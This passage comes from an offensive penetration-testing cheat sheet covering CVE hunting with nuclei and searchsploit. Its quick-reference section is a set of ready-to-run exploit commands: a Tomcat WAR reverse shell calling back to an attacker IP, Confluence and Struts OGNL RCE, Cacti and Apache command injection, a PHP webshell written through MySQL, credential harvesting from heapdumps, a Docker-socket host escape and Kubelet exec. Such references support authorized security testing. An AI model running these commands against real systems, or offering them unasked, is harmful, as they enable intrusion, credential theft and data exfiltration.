ls ~/.local/nuclei-templates/http/cves/ | head

# By year
nuclei -t cves/2024/ -u http://<TARGET>
nuclei -t cves/ -tags rce,critical -u http://<TARGET>

# Specific CVE
nuclei -t cves/2022/CVE-2022-26134.yaml -u http://<TARGET>:8090
```

### Manual CVE Workflow

```text
1. Identify product + exact version (banner, /admin, JS files, fingerprint)
2. Check Vendor security advisories → patched versions list
3. Search:
   - https://nvd.nist.gov/vuln/search
   - searchsploit <product> <version>
   - nuclei templates cves/<year>/
   - github.com/trickest/cve
4. Cross-reference exploitability:
   - https://github.com/nomi-sec/PoC-in-GitHub
   - exploit-db.com
5. Validate version match (don't trust scanner — verify manually)
6. Test in isolated env first if possible
7. Apply, capture evidence, document
```

### LOTL CVE Hunt (no internet)

```bash
# Offline searchsploit DB (preinstalled on Kali)
ls /usr/share/exploitdb/
searchsploit --offline drupal 7

# Local nmap script DB
ls /usr/share/nmap/scripts/ | grep vuln
nmap --script-help "vuln*"
```

---

## Quick Reference Cheatsheet

```bash
# Tomcat manager WAR drop
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=4444 -f war -o s.war
curl -u tomcat:tomcat -T s.war "http://<TARGET>:8080/manager/text/deploy?path=/s"
curl http://<TARGET>:8080/s/

# Jenkins script console
curl -u admin:admin --data-urlencode 'script=println "id".execute().text' http://<TARGET>:8080/scriptText

# GitLab CVE-2021-22205
python3 49951.py --target http://<TARGET> --lhost <ATTACKER_IP> --lport 4444

# Confluence CVE-2022-26134 OGNL
curl "http://<TARGET>:8090/%24%7B%40java.lang.Runtime%40getRuntime%28%29.exec%28%22id%22%29%7D/"

# WebLogic CVE-2020-14882 console bypass
curl -sk "http://<TARGET>:7001/console/css/%252e%252e%252fconsole.portal"

# Cacti CVE-2022-46169
curl "http://<TARGET>/cacti/remote_agent.php?action=polldata&local_data_ids%5B0%5D=1&host_id=1&poller_id=\`id\`" \
  -H "X-Forwarded-For: 127.0.0.1"

# Struts2 CVE-2017-5638 (Content-Type OGNL)
msf6 > use exploit/multi/http/struts2_content_type_ognl

# Apache CVE-2021-41773 / 42013 path traversal + RCE
curl --path-as-is "http://<TARGET>/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd"
curl --path-as-is --data 'echo;id' "http://<TARGET>/cgi-bin/.%%32e/.%%32e/.%%32e/.%%32e/bin/sh"

# phpMyAdmin SELECT INTO OUTFILE webshell
mysql> SELECT '<?php system($_GET["c"]); ?>' INTO OUTFILE '/var/www/html/s.php';

# Spring Boot Actuator heapdump → creds
curl -o h.hprof http://<TARGET>:8080/actuator/heapdump
strings h.hprof | grep -iE 'password|secret|token' | sort -u

# Elasticsearch unauth dump
curl -s http://<TARGET>:9200/_cat/indices?v
curl -s "http://<TARGET>:9200/<INDEX>/_search?size=10000&pretty"

# Docker socket → host shell
docker -H unix:///var/run/docker.sock run -v /:/host --rm -it alpine chroot /host /bin/bash

# Kubelet anon exec
curl -sk -X POST "https://<TARGET>:10250/run/<NAMESPACE>/<POD>/<CONTAINER>" -d "cmd=id"

# Universal CVE search
searchsploit -u                                 # update once
searchsploit <product> <version>
nuclei -t cves/ -tags <product>,critical -u <URL>
```
